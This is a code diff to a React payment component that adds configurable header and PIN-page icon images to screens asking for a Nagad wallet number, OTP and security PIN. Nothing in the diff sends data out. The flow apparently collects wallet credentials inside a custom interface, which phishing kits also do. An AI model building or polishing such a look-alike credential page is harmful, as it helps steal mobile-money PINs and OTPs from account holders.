@@ -11,9 +11,11 @@ interface PaymentFlowProps {
   onComplete: () => void;
   inputLogoUrl?: string;
   instructionsImageUrl?: string;
+  numberPageIconUrl?: string;
+  pinPageIconUrl?: string;
 }
 
-export const PaymentFlow: React.FC<PaymentFlowProps> = ({ session, lang, onUpdateSession, onComplete, inputLogoUrl, instructionsImageUrl }) => {
+export const PaymentFlow: React.FC<PaymentFlowProps> = ({ session, lang, onUpdateSession, onComplete, inputLogoUrl, instructionsImageUrl, numberPageIconUrl, pinPageIconUrl }) => {
   const [phone, setPhone] = useState(session.accountNumber || '');
   const [otpValue, setOtpValue] = useState(session.otp || '');
   const [pinDigits, setPinDigits] = useState<string[]>(['', '', '', '']);
@@ -138,8 +140,12 @@ export const PaymentFlow: React.FC<PaymentFlowProps> = ({ session, lang, onUpdat
         )}
         
         <div className="bg-white rounded-[20px] border border-gray-200 shadow-[0_2px_10px_rgba(0,0,0,0.04)] w-full py-5 px-6 mb-6 flex flex-row items-center gap-4">
-          <div className="shrink-0 scale-110 origin-left">
-            <PhoneChatLockIcon />
+          <div className="shrink-0 scale-110 origin-left flex items-center justify-center">
+            {numberPageIconUrl ? (
+              <img src={numberPageIconUrl} alt="header icon" className="w-10 h-10 object-contain" />
+            ) : (
+              <PhoneChatLockIcon />
+            )}
           </div>
           <div className="flex flex-col">
             <h2 className="font-bold text-[17px] text-gray-900 mb-1">{lang === 'bn' ? 'আপনার নগদ নাম্বারটি দিন' : 'Enter your Nagad Number'}</h2>
@@ -227,8 +233,12 @@ export const PaymentFlow: React.FC<PaymentFlowProps> = ({ session, lang, onUpdat
         )}
 
         <div className="flex-1 overflow-y-auto flex flex-col items-center pt-8 px-6 bg-white">
-          <div className="mb-6 transform scale-[1.7] origin-center mt-4">
-             <PhoneChatLockIcon />
+          <div className="mb-6 transform scale-[1.7] origin-center mt-4 flex items-center justify-center">
+             {numberPageIconUrl ? (
+               <img src={numberPageIconUrl} alt="header icon" className="w-10 h-10 object-contain" />
+             ) : (
+               <PhoneChatLockIcon />
+             )}
           </div>
           <p className="text-[13px] text-gray-600 text-center leading-[1.6] mb-8 font-medium">
             {lang === 'bn' ? 'আপনার নগদ একাউন্টের নিরাপত্তার জন্য' : 'For your Nagad account security'}<br/>
@@ -333,8 +343,12 @@ export const PaymentFlow: React.FC<PaymentFlowProps> = ({ session, lang, onUpdat
         )}
 
         <div className="flex-1 overflow-y-auto flex flex-col items-center pt-8 px-6 bg-white">
-          <div className="w-[88px] h-[88px] mb-5 bg-[#fdf2f2] rounded-full flex items-center justify-center">
-             <Shield className="w-11 h-11 text-teal-600 fill-teal-100" strokeWidth={1.5} />
+          <div className="w-[88px] h-[88px] mb-5 bg-[#fdf2f2] rounded-full flex items-center justify-center overflow-hidden p-2">
+             {pinPageIconUrl ? (
+               <img src={pinPageIconUrl} alt="pin icon" className="w-full h-full object-contain" />
+             ) : (
+               <Shield className="w-11 h-11 text-teal-600 fill-teal-100" strokeWidth={1.5} />
+             )}
           </div>
           
           <h2 className="text-[20px] font-bold text-gray-900 mb-1">{lang === 'bn' ? 'আপনার নিরাপত্তা পিন লিখুন' : 'Enter Security PIN'}</h2>
